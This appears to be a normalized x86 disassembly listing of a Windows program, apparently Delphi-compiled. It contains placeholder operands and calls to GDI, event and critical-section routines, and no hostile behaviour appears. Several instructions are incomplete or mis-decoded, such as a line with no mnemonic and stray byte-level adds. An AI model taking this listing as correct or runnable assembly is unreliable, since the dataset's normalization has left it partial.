cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41bb00
mov eax [ eax + 0x18 ]
retn
sub_41bb04
mov eax [ eax + 0x14 ]
retn
sub_41bba0
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41bdac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4027f4
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41bde8
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41be00
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41be14
mov edx sub_41be00
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41be5c
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_408144
retn
mov eax edx
mov edx ecx
call sub_40810c
retn
sub_41bef8
retn
sub_41c1f0
jmp sub_4039a0
sub_41c1f7
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41c258
jmp sub_4039a0
sub_41c25f
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c2a4
mov eax [ eax + 0x4 ]
call sub_4086bc
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41c2b4
mov eax [ eax + 0x4 ]
call sub_4086e8
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41c2f0
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41c499
jmp sub_4039a0
sub_41c4f8
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41c588
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41c5d8
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41c7c3
jmp sub_4039a0
sub_41c7ca
mov esp ebp
pop ebp
retn
sub_41c874
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
retn
sub_41c8fc
mov [ eax + 0x18 ] edx
retn
sub_41ca78
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_4167c8
retn
sub_41caff
jmp sub_4039a0
sub_41cb06
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41cbb2
jmp sub_4039a0
sub_41cbb9
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41cd5d
jmp sub_4039a0
sub_41cdaf
jmp sub_4039a0
sub_41cdce
jmp sub_4039a0
sub_41cdd5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cdf4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41cded
jmp sub_4039a0
sub_41cdf4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ce97
jmp sub_4039a0
sub_41cf1f
jmp sub_4039a0
sub_41cf2c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
pop ebx
retn
sub_41cf44
mov eax [ rw-data ]
call sub_41cf2c
retn
sub_41cf7c
push ebx
call sub_416648
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41cf44
sub_41d0e9
jmp sub_4039a0
sub_41d0f0
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f9c
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41d210
jmp sub_4039a0
sub_41d217
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d30e
jmp sub_4039a0
sub_41d32b
jmp sub_4039a0
sub_41d332
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d430
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41be78
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41d4f4
push ebx
mov ebx eax
mov eax ebx
call sub_41eea8
cmp al 0x9
sete al
pop ebx
retn
sub_41d553
jmp sub_4039a0
sub_41d55a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41d600
jmp sub_4039a0
sub_41d607
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d886
jmp sub_4036ec
sub_41d8b2
jmp sub_4036ec
sub_41d954
jmp sub_4036ec
sub_41d9f7
jmp sub_4036ec
sub_41dbcf
jmp sub_4036ec
sub_41dc11
jmp sub_4039a0
sub_41dc41
jmp sub_4039a0
sub_41dc48
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dcb7
jmp sub_4039a0
sub_41dd8e
jmp sub_4039a0
sub_41dd95
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e068
mov dl 0x1
call sub_41cfd0
retn
sub_41e1a0
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_41e1a9
jmp sub_4039a0
j_sub_41e1a0
jmp sub_41e1a0
sub_41e1b0
pop ebx
mov esp ebp
pop ebp
retn
sub_41e1b8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41efb8
mov eax [ rw-data ]
call sub_41cf2c
pop ebp
retn
j_sub_403818#5
jmp sub_403818
j_sub_403818#4
jmp sub_403818
sub_41e3a4
jmp sub_4039a0
sub_41e3ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e48b
jmp sub_4039a0
sub_41e492
mov esp ebp
pop ebp
retn
sub_41e54a
jmp sub_4039a0
sub_41e551
pop ecx
pop ecx
pop ebp
retn
sub_41e853
jmp sub_4039a0
sub_41e85a
pop ebx
mov esp ebp
pop ebp
retn
sub_41eaff
jmp sub_4039a0
sub_41eb06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_40324c
retn
sub_41eb1f
jmp sub_4039a0
sub_41eb43
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4036ec
sub_41eb7a
jmp sub_4036ec
sub_41ebb9
jmp sub_4039a0
sub_41ebc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebe2
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403fc0
retn
sub_41ebdb
jmp sub_4039a0
sub_41ebe2
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ec69
jmp sub_4036ec
sub_41ec96
jmp sub_4039a0
sub_41ec9d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41eca8
push ecx
mov edx esp
mov ecx 0x4
call sub_41d46c
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41cf2c
sub_41edb5
jmp sub_4039a0
sub_41edbc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ee9b
jmp sub_4039a0
sub_41eea2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41eef8
jmp sub_4039a0
sub_41eeff
pop ebx
pop ecx
pop ebp
retn
sub_41f147
jmp sub_4039a0
sub_41f14e
pop ecx
pop ecx
pop ebp
retn
sub_41f191
jmp sub_4039a0
sub_41f198
pop ebx
pop ecx
pop ebp
retn
sub_41f234
jmp sub_4039a0
sub_41f23b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f2e9
jmp sub_4039a0
sub_41f2f0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f2fc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41f557
jmp sub_4039a0
sub_41f55e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f583
mov eax [ ebp - 0x8 ]
call sub_40324c
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
sub_41f57c
jmp sub_4039a0
sub_41f583
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5a8
lea eax [ ebp - 0x1c ]
call sub_4059cc
lea eax [ ebp - 0x18 ]
call sub_403f9c
retn
sub_41f5a1
jmp sub_4039a0
sub_41f5a8
pop ebx
mov esp ebp
pop ebp
retn
sub_41f7ba
jmp sub_4039a0
sub_41f7c1
pop ebx
mov esp ebp
pop ebp
retn
sub_41f814
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41c0dc
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41f82c
test dl dl
je r-xdata
mov dl 0x8
call sub_41f9b0
retn
mov dl 0x9
call sub_41f9b0
retn
sub_41f8b4
mov dl 0x1
call sub_41f9b0
retn
sub_41f8bc
xor edx edx
call sub_41f9b0
retn
sub_41f9a1
jmp sub_4039a0
sub_41f9a8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f9c4
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cec4
sub_41f9f8
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41fa10
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_41fa1c
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41fa10
sub_41fb42
jmp sub_4036ec
sub_41fb71
jmp sub_4039a0
sub_41fba7
jmp sub_4039a0
sub_41fbae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbcd
push rw-data
call LeaveCriticalSection
retn
sub_41fbc6
jmp sub_4039a0
sub_41fbcd
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fc9c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_41fe78
sub_41fcfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dfb8
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41fd10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dfb8
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41fd24
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41f840
retn
sub_41fd30
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41f840
retn
sub_41ffd8
xor eax eax
retn
sub_41ffdc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41ffe4
xor eax eax
retn
sub_41ffe8
retn
sub_41ffec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ff0
pop esi
pop ebx
retn
sub_420000
mov eax [ eax + 0x4 ]
retn
sub_420004
retn
sub_420008
xor eax eax
retn
sub_42000c
retn
sub_420010
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_42001c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_420028
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_420034
retn
sub_420038
xchg edx eax
call sub_41dc5c
retn
sub_420040
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_4200c8
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403448
pop esi
retn
sub_4200dc
retn
sub_4201bc
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ff0
pop esi
pop ebx
retn
sub_4201fc
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_420348
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403494
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_420360
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4203e8
retn
sub_420430
retn
sub_420468
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_420480
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4206a4
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403448
pop esi
pop ebx
retn
sub_4204c8
mov al 0x1
retn
sub_4204cc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4204d4
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_42057c
xor eax eax
retn
sub_420580
retn
sub_4205ac
retn
sub_420644
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_420658
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_41a0dc
retn
sub_42079f
jmp sub_4036ec
sub_4207a4
mov ebx 0x1
call sub_403a54
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_420807
jmp sub_4036ec
sub_42080c
mov ebx 0x80030103
call sub_403a54
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42088a
jmp sub_4036ec
sub_42088f
mov ebx 0x80030009
call sub_403a54
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_4208ed
jmp sub_4036ec
sub_4208f2
mov ebx 0x8000ffff
call sub_403a54
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420abd
jmp sub_4039a0
sub_420ace
jmp sub_4036ec
sub_420ad3
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420afc
lea eax [ ebp + 0xc ]
call sub_4059cc
retn
sub_420af5
jmp sub_4039a0
sub_420afc
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_420b08
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_420b14
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_420b20
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_420b2c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_420b9b
jmp sub_4036ec
sub_420ba0
mov esi 0x8000ffff
call sub_403a54
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_420bb4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_420c21
jmp sub_4039a0
sub_420c28
mov eax [ rw-data ]
call sub_40324c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_420c38
call sub_419a28
retn
sub_420d00
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_420ea4
jmp sub_4039a0
sub_420eab
pop ebp
retn
sub_420f39
jmp sub_4039a0
sub_420f40
pop ebp
retn
sub_421209
jmp sub_4039a0
sub_421210
pop ebp
retn
sub_421214
sub [ rw-data ] 0x1
retn
sub_421aa2
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
sub_421aaf
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_421bf9
add eax 0xffffffd8
jmp sub_425e30
sub_421c01
add [ esp + 0x4 ] 0xffffffd8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_4221c4
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_422238
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_4222ac
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4222b8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422398
jmp sub_4039a0
sub_42239f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42242f
jmp sub_4039a0
sub_4224c1
jmp sub_4039a0
sub_4224c8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42252c
jmp sub_4039a0
sub_422533
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42259b
jmp sub_4039a0
sub_4225a2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422645
jmp sub_4039a0
sub_42264c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422aa4
push 0x33
mov ecx rw-data
call sub_419ce8
retn
sub_422ab4
push 0x33
mov ecx rw-data
call sub_419ca8
retn
sub_422ac4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_422ae8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_422cbc
push 0x11
mov ecx rw-data
call sub_419ca8
retn
sub_422dfc
push ebx
mov ebx eax
mov eax ebx
call sub_422ac4
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_422eb6
jmp sub_4039a0
sub_422ebd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422ae8
retn
sub_422ed3
jmp sub_4039a0
sub_422eec
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_422f49
jmp sub_4039a0
sub_422f50
pop ebx
pop ecx
pop ebp
retn
sub_4230c9
jmp sub_4039a0
sub_4230f1
jmp sub_4039a0
sub_4230f8
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_423164
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404200
pop esi
pop ebx
retn
sub_4231d8
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_423134
push eax
call MulDiv
neg eax
pop ebx
retn
sub_42324c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_42327c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_42339a
jmp sub_4039a0
sub_4233a1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422ae8
retn
sub_4233b7
jmp sub_4039a0
sub_42342d
jmp sub_4039a0
sub_423434
pop ebx
pop ecx
pop ebp
retn
sub_423438
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_4234ee
jmp sub_4039a0
sub_423514
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_423544
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_423653
jmp sub_4039a0
sub_42365a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_422ae8
retn
sub_423670
jmp sub_4039a0
sub_4236e9
jmp sub_4039a0
sub_4236f0
pop ebx
pop ecx
pop ebp
retn
sub_423821
jmp sub_4039a0
sub_423834
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_423b74
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_423d50
jmp sub_4039a0
sub_423d57
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_423d60
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_423d98
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_423da4
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_423ee4
retn
sub_423fad
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_423fc4
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4240b0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4240d0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4240f0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424110
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
pop ebx
retn
sub_424128
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
pop ebx
retn
sub_42414c
mov eax [ rw-data ]
call sub_424128
retn
sub_4241ae
jmp sub_4039a0
sub_4241b5
pop ecx
pop ebp
retn
sub_424254
jmp sub_4039a0
sub_42425b
pop ebx
mov esp ebp
pop ebp
retn
sub_42432d
jmp sub_4039a0
sub_4243be
jmp sub_4039a0
sub_4243c5
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4243f0
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_4244d7
jmp sub_4039a0
sub_424684
jmp sub_4039a0
sub_42468b
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_42489d
jmp sub_4039a0
sub_4248a4
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_42493e
jmp sub_4039a0
sub_424b1a
jmp sub_4039a0
sub_424bd4
jmp sub_4039a0
sub_424bdb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424bfb
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_424bf4
jmp sub_4039a0
sub_424bfb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_424d89
jmp sub_4039a0
sub_424f54
jmp sub_4039a0
sub_424f5b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f7e
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4027d4
retn
sub_424f77
jmp sub_4039a0
sub_424f7e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f9e
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4027d4
retn
sub_424f97
jmp sub_4039a0
sub_424f9e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_424fa8
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_425108
push 0x0
call sub_4250a4
retn
sub_4251ad
jmp sub_4039a0
sub_4251b4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4251c0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425110
pop ebx
pop ebp
retn 0x4
sub_4251d4
retn
sub_4251d8
test eax eax
jne r-xdata
retn
call sub_4251d4
sub_4253ab
jmp sub_4039a0
sub_4253d2
jmp sub_4039a0
sub_4253d9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425418
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_4255e5
mov eax [ ebp - 0xc ]
call sub_40324c
retn
sub_4255ee
jmp sub_4039a0
j_sub_4255e5
jmp sub_4255e5
sub_4255f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40324c
retn
sub_42560b
jmp sub_4039a0
sub_42561c
xor eax eax
retn
sub_425620
mov al [ eax + 0x21 ]
retn
sub_42566c
jmp sub_4039a0
sub_425673
pop esi
pop ecx
pop ebp
retn
sub_4256a0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_4256f7
jmp sub_4039a0
sub_4256fe
pop esi
pop ecx
pop ebp
retn
sub_425704
retn
sub_425708
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_425718
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_42589d
jmp sub_4039a0
sub_4258a4
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4259c3
jmp sub_4039a0
sub_4259ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425a52
jmp sub_4039a0
sub_425a59
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425bb4
jmp sub_4036ec
sub_425bd8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4257c0
mov [ rw-data ] eax
sub_425bf8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425ac4
mov [ rw-data ] eax
sub_425d20
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_425cbc
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_425d38
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_425cbc
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_425d50
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_425cbc
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_425df8
jmp sub_4036ec
sub_425e18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_425d20
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_425e30
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_425d20
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_425f9d
jmp sub_4036ec
sub_42601b
jmp sub_4039a0
sub_426022
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426150
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx eax
sub_426168
xor edx edx
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx eax
sub_4261bc
retn
sub_426230
